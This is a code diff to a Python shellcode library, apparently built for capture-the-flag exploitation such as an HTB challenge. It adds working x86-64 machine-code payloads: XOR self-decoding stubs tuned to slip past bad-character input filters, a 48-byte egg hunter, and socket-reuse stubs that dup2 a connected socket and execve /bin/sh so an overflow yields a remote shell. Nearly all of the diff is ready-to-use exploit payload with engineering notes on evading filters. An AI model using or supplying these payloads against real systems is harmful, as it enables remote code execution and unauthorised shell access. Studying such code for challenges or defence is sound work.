@@ -38,38 +38,121 @@ def execve_binsh() -> bytes:
     )
 
 
-def encode_avoiding(payload: bytes, bad: bytes):
+#: Base decoder stub lengths, before padding. Two decoders, because the one-byte key makes the
+#: SMALLER stub and the four-byte key succeeds far more often: a single key byte has to clear every
+#: banned byte for the whole payload at once, so the longer the payload the likelier all 256 keys
+#: are ruled out -- measured, an 82-byte stub against a 5-byte banned set has NO single-byte key.
+#: With a rolling 4-byte key each key byte only has to clear the payload bytes at its own position
+#: mod 4, which is a quarter of the constraints and four independent searches.
+#:
+#: Three encoding choices here are each the result of a banned set defeating the obvious one:
+#:
+#: * the `jmp`/`call`/`pop` get-PC, not `lea rsi, [rip+N]`. RIP-relative addressing has only a
+#:   disp32, so a FORWARD reference of a few dozen bytes writes three NUL bytes into the stub --
+#:   and the decoder was being asked for exactly `{0x00, 0x0a}` ("a line reader stops at NUL /
+#:   newline") at a call site that could therefore never succeed. A backward `call` is a small
+#:   negative disp32, which is 0xff bytes and no NULs, and its pushed return address IS the
+#:   payload's address.
+#: * `dec dl; jnz`, not `loop`. `loop` needs the WHOLE of rcx zeroed first, and every short way to
+#:   zero it (`xor ecx,ecx`, `sub ecx,ecx`) encodes the ModRM byte 0xc9 -- which HTB execute's
+#:   banned set, the one real set this module was built against, bans. `dec dl` takes the zero flag
+#:   off dl alone, so the register's upper bits never matter.
+#: * PADDING. Even then the `jnz`'s own displacement came out as 0xf6, also banned by that set. The
+#:   loop body therefore takes 0 to 3 filler bytes, which slides every displacement in the stub, and
+#:   the encoder searches those variants alongside the keys. A stub with fixed bytes is only ever
+#:   LUCKY with respect to a banned set; searching a small variant space is what makes it robust.
+_STUB1 = 25
+_STUB4 = 32
+_PAD = b"\x90"                                           # nop
+
+
+def _decoder1(enc_len: int, key: int, pad: int = 0) -> bytes:
+    """One-byte XOR decoder. rsi walks the encoded bytes, rdi keeps the start, `jmp rdi` enters the
+    decoded payload."""
+    total = _STUB1 + pad
+    stub = (b"\xeb" + bytes([total - 7])                 # jmp getpc
+            + b"\x5e"                                    # L1: pop rsi   ; rsi = &payload
+            + b"\x48\x89\xf7"                           # mov rdi, rsi
+            + b"\xb2" + bytes([enc_len])                  # mov dl, len
+            + b"\x80\x36" + bytes([key])                 # decode: xor byte [rsi], key
+            + b"\x48\xff\xc6"                           # inc rsi
+            + _PAD * pad                                  # (slides the displacements)
+            + b"\xfe\xca"                                # dec dl
+            + b"\x75" + bytes([(-(10 + pad)) & 0xFF])     # jnz decode
+            + b"\xff\xe7"                                # jmp rdi
+            + b"\xe8" + struct.pack("<i", 2 - total))     # getpc: call L1
+    assert len(stub) == total, (len(stub), total)
+    return stub
+
+
+def _decoder4(enc_len: int, seq, pad: int = 0) -> bytes:
+    """Four-byte ROLLING XOR decoder. `rol eax, 8` cycles the key through al, so the byte used at
+    position i is `seq[i % 4]`.
+
+    The immediate's byte order is not the key order: `mov eax, imm32` is little-endian, so al is
+    imm32's low byte, and after each `rol eax, 8` al becomes the next byte DOWN from the top. The
+    al sequence for instruction bytes (b0, b1, b2, b3) is therefore (b0, b3, b2, b1) -- so the
+    immediate is emitted as seq[0], seq[3], seq[2], seq[1]."""
+    s0, s1, s2, s3 = seq
+    total = _STUB4 + pad
+    stub = (b"\xeb" + bytes([total - 7])                 # jmp getpc
+            + b"\x5e"                                    # L1: pop rsi
+            + b"\x48\x89\xf7"                           # mov rdi, rsi
+            + b"\xb2" + bytes([enc_len])                  # mov dl, len
+            + b"\xb8" + bytes([s0, s3, s2, s1])           # mov eax, imm32 (the rolling key)
+            + b"\x30\x06"                                # decode: xor byte [rsi], al
+            + b"\xc1\xc0\x08"                           # rol eax, 8
+            + b"\x48\xff\xc6"                           # inc rsi
+            + _PAD * pad
+            + b"\xfe\xca"                                # dec dl
+            + b"\x75" + bytes([(-(12 + pad)) & 0xFF])     # jnz decode
+            + b"\xff\xe7"                                # jmp rdi
+            + b"\xe8" + struct.pack("<i", 2 - total))     # getpc: call L1
+    assert len(stub) == total, (len(stub), total)
+    return stub
+
+
+def encode_avoiding(payload: bytes, bad: bytes, *, pads=(0, 1, 2, 3)):
     """Wrap `payload` in a position-independent XOR decoder so the WHOLE thing avoids every byte in
     `bad`, for a target that filters the input before running it (bad-char constraint, e.g. HTB
-    execute bans 0x3b/0xc0/"/bin/sh"). Searches a single-byte key whose decoder stub AND encoded
-    payload are all bad-char-free. Returns the self-decoding shellcode, or None when no key works
-    (an irreducible fixed stub byte is banned, or every key leaves a banned encoded byte).
+    execute bans 0x3b/0xc0/"/bin/sh"). Returns the self-decoding shellcode, or None when nothing in
+    the (key x padding) space works.
 
-    Decoder (RIP-relative, no bad-char-prone `call` get-PC): rsi -> encoded bytes, save it in rdi,
-    XOR each byte in place, then `jmp rdi` into the now-decoded payload. The payload sits in the
-    same executable+writable buffer (execstack / RWX), so the in-place decode is legal."""
+    A one-byte key is tried first because its stub is the smaller one; a four-byte rolling key is
+    the fallback, and it is what makes the longer stubs in this module (`egg_hunter` at 48 bytes,
+    `find_socket_execve_binsh` at 82) encodable at all.
+
+    The payload sits in the same executable+writable buffer (execstack / RWX), so the in-place
+    decode is legal. The length goes in `dl` rather than through `push N; pop rcx`: `push imm8`
+    SIGN-EXTENDS, so a payload of 128 bytes or more set rcx to ~2^64 and the decode loop ran over
+    the whole address space."""
     badset = set(bad)
-    if len(payload) > 255:
-        return None                                      # push imm8 length
-    _STUB = 23                                           # fixed stub length (payload starts here)
-    for key in range(1, 256):
+    if not payload or len(payload) > 255:
+        return None                                      # mov dl, N
+    for key in range(1, 256):                            # one byte: the smaller stub
         if key in badset:
             continue
         enc = bytes(b ^ key for b in payload)
-        if any(e in badset for e in enc):
+        if badset & set(enc):
             continue
-        stub = (
-            b"\x48\x8d\x35" + struct.pack("<i", _STUB - 7)   # lea rsi, [rip + (payload-after-lea)]
-            + b"\x48\x89\xf7"                                # mov rdi, rsi        ; save start
-            + b"\x6a" + bytes([len(enc)]) + b"\x59"          # push len ; pop rcx
-            + b"\x80\x36" + bytes([key])                     # decode: xor byte [rsi], key
-            + b"\x48\xff\xc6"                                # inc rsi
-            + b"\xe2\xf8"                                    # loop decode  (rel8 -> the xor)
-            + b"\xff\xe7"                                    # jmp rdi      ; into decoded payload
-        )
-        assert len(stub) == _STUB
-        blob = stub + enc
-        if not any(x in badset for x in blob):
+        for pad in pads:
+            blob = _decoder1(len(enc), key, pad) + enc
+            if not (badset & set(blob)):
+                return blob
+    # Four-byte rolling key. Each position class is independent, so the four searches are
+    # separate -- which is the whole gain over the single key.
+    seq = []
+    for j in range(4):
+        col = payload[j::4]
+        k = next((c for c in range(1, 256)
+                  if c not in badset and not (badset & {b ^ c for b in col})), None)
+        if k is None:
+            return None
+        seq.append(k)
+    enc = bytes(b ^ seq[i % 4] for i, b in enumerate(payload))
+    for pad in pads:
+        blob = _decoder4(len(enc), seq, pad) + enc
+        if not (badset & set(blob)):
             return blob
     return None
 
@@ -160,3 +243,147 @@ def write_marker_aarch64(marker: bytes) -> bytes:
         0xD2800BA8,                      # mov x8, #93           ; __NR_exit
         0xD4000001,                      # svc #0
     ) + marker
+
+
+# --------------------------------------------------------------- the buffer is too small: egg hunt
+#: The tag is searched for TWICE in a row, which is what keeps the hunter from finding the copy of
+#: the tag inside its own instruction stream: `mov eax, TAG` embeds it once, never twice.
+EGG_TAG = b"W00T"
+_EGG_LEN = 48
+
+
+def egg_hunter(tag: bytes = EGG_TAG) -> bytes:
+    """A 48-byte x86-64 egg hunter: walk memory forward from the hunter's own address until a
+    doubled `tag` is found, then jump to the byte after it.
+
+    The answer to a target whose EXECUTABLE buffer is too small for a payload but which has a
+    larger buffer somewhere else -- an environment variable, an argv string, a heap copy of a file
+    -- that the same process holds. The hunter goes in the small one, `egg()` in the large one, and
+    no address has to be known.
+
+    Two details that are the difference between working and not, both measured:
+
+    * the walk starts at `lea rdx, [rip]`, not at 0. A hunter that starts from the bottom of the
+      address space makes one `access()` syscall per page across 47 bits of address space and never
+      arrives; the payload came in on the same input, so it is nearly always ABOVE the hunter.
+    * the page probe is `access(rdx + 8, 0)`, not `access(rdx, 0)`. The comparison reads EIGHT
+      bytes (`scasd` twice), so a window whose first byte is on a mapped page and whose last is not
+      faults even though the probe passed -- seen as a SIGSEGV at exactly the distance where the
+      scan crossed into unmapped memory. Probing the window's END covers both pages in one
+      syscall, because the walk only ever enters pages it has already validated.
+
+    `access` is the probe rather than a signal handler because its -EFAULT return (low byte 0xf2)
+    reports an unmapped page WITHOUT taking a signal, so the hunter needs no SIGSEGV handler and
+    leaves the process's own handlers alone. Assembled against `as --64`; measured finding a
+    payload 0x100, 0x4000 and 0x100000 bytes away, and declining when the tag is broken."""
+    if len(tag) != 4:
+        raise ValueError("the egg tag is 4 bytes (it is compared with scasd, twice)")
+    code = (
+        b"\x48\x8d\x15\x00\x00\x00\x00"   #            lea rdx, [rip]      ; start at ourselves
+        b"\x48\xff\xc2"                   # next_addr: inc rdx
+        b"\x48\x8d\x7a\x08"               #            lea rdi, [rdx+8]    ; probe the window END
+        b"\x6a\x15"                       #            push 21
+        b"\x58"                           #            pop rax             ; __NR_access
+        b"\x31\xf6"                       #            xor esi, esi        ; mode = 0
+        b"\x0f\x05"                       #            syscall
+        b"\x3c\xf2"                       #            cmp al, 0xf2        ; -EFAULT?
+        b"\x74\x10"                       #            je next_page
+        b"\xb8" + bytes(tag) +            #            mov eax, tag
+        b"\x48\x89\xd7"                   #            mov rdi, rdx
+        b"\xaf"                           #            scasd
+        b"\x75\xe3"                       #            jne next_addr
+        b"\xaf"                           #            scasd               ; the tag TWICE
+        b"\x75\xe0"                       #            jne next_addr
+        b"\xff\xe7"                       #            jmp rdi
+        b"\x66\x81\xca\xff\x0f"           # next_page: or dx, 0xfff
+        b"\xeb\xd7"                       #            jmp next_addr
+    )
+    assert len(code) == _EGG_LEN, len(code)
+    return code
+
+
+def egg(payload: bytes, tag: bytes = EGG_TAG) -> bytes:
+    """`payload` with the doubled tag in front, for delivery on whatever channel has ROOM. What
+    `egg_hunter` jumps to is the first byte after the eight tag bytes."""
+    if len(tag) != 4:
+        raise ValueError("the egg tag is 4 bytes")
+    return bytes(tag) * 2 + bytes(payload)
+
+
+# ------------------------------------------------- the shell has to come back the way it came in
+def find_socket_execve_binsh(max_fd: int = 0x100) -> bytes:
+    """An 82-byte x86-64 stub that finds the CONNECTED socket among the low file descriptors,
+    dup2's it onto stdin/stdout/stderr and execve's a shell -- so an overflow delivered over a
+    network talks back over the connection it arrived on.
+
+    `execve_binsh` alone is useless on a network target: the shell it spawns inherits the service's
+    own stdio, which goes to a log or /dev/null, and nothing reaches the attacker. The usual
+    alternative is a reverse shell, which needs outbound egress and a second channel to verify.
+    This needs neither.
+
+    `getpeername(fd)` returning 0 is the test, and it is the right one: it succeeds only on a
+    socket that HAS a peer, so a LISTENING socket fails it (ENOTCONN) and so does every regular
+    file, pipe and tty (ENOTSOCK) -- measured walking 0, 1, 2 (ENOTSOCK), 3 (EBADF, the listening
+    socket the child closed) and finding 4. It gives up at `max_fd` and exits quietly rather than
+    looping, because a stub that runs wild in a service is worse than one that does nothing."""
+    if not 0 < max_fd <= 0x10000:
+        raise ValueError("max_fd out of range")
+    return (
+        b"\x31\xff"                       #            xor edi, edi        ; fd = 0
+        b"\x48\x8d\x74\x24\x80"           # next_fd:   lea rsi, [rsp-0x80] ; sockaddr_storage
+        b"\x48\x8d\x94\x24\x78\xff\xff\xff"  #         lea rdx, [rsp-0x88] ; socklen_t*
+        b"\xc7\x02\x80\x00\x00\x00"       #            mov dword [rdx], 0x80
+        b"\x6a\x34"                       #            push 52
+        b"\x58"                           #            pop rax             ; __NR_getpeername
+        b"\x0f\x05"                       #            syscall
+        b"\x85\xc0"                       #            test eax, eax
+        b"\x74\x0f"                       #            je found
+        b"\xff\xc7"                       #            inc edi
+        b"\x81\xff" + _p32(max_fd) +      #            cmp edi, max_fd
+        b"\x75\xda"                       #            jne next_fd
+        b"\x6a\x3c"                       #            push 60
+        b"\x58"                           #            pop rax             ; __NR_exit
+        b"\x0f\x05"                       #            syscall
+        b"\x31\xf6"                       # found:     xor esi, esi        ; newfd = 0,1,2
+        b"\x6a\x21"                       # dup_loop:  push 33
+        b"\x58"                           #            pop rax             ; __NR_dup2
+        b"\x0f\x05"                       #            syscall
+        b"\xff\xc6"                       #            inc esi
+        b"\x83\xfe\x03"                   #            cmp esi, 3
+        b"\x75\xf4"                       #            jne dup_loop
+        b"\x31\xf6"                       #            xor esi, esi        ; argv = NULL
+        b"\x31\xd2"                       #            xor edx, edx        ; envp = NULL
+        b"\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"   # movabs rbx, "/bin/sh\0"
+        b"\x53"                           #            push rbx
+        b"\x48\x89\xe7"                   #            mov rdi, rsp
+        b"\x6a\x3b"                       #            push 59
+        b"\x58"                           #            pop rax             ; __NR_execve
+        b"\x0f\x05"                       #            syscall
+    )
+
+
+def dup2_execve_binsh(fd: int) -> bytes:
+    """The same thing for a fd that is already KNOWN -- 40 bytes instead of 82, which is what
+    matters when the executable buffer is the constraint. `fd` must fit in an imm8 (`push`), which
+    every realistic service fd does."""
+    if not 0 <= fd <= 0x7F:
+        raise ValueError("fd must fit a push imm8; use find_socket_execve_binsh instead")
+    return (
+        b"\x6a" + bytes([fd]) +           #            push fd
+        b"\x5f"                           #            pop rdi
+        b"\x31\xf6"                       #            xor esi, esi
+        b"\x6a\x21"                       # dup_loop:  push 33
+        b"\x58"                           #            pop rax             ; __NR_dup2
+        b"\x0f\x05"                       #            syscall
+        b"\xff\xc6"                       #            inc esi
+        b"\x83\xfe\x03"                   #            cmp esi, 3
+        b"\x75\xf4"                       #            jne dup_loop
+        b"\x31\xf6"                       #            xor esi, esi
+        b"\x31\xd2"                       #            xor edx, edx
+        b"\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"   # movabs rbx, "/bin/sh\0"
+        b"\x53"                           #            push rbx
+        b"\x48\x89\xe7"                   #            mov rdi, rsp
+        b"\x6a\x3b"                       #            push 59
+        b"\x58"                           #            pop rax             ; __NR_execve
+        b"\x0f\x05"                       #            syscall
+    )
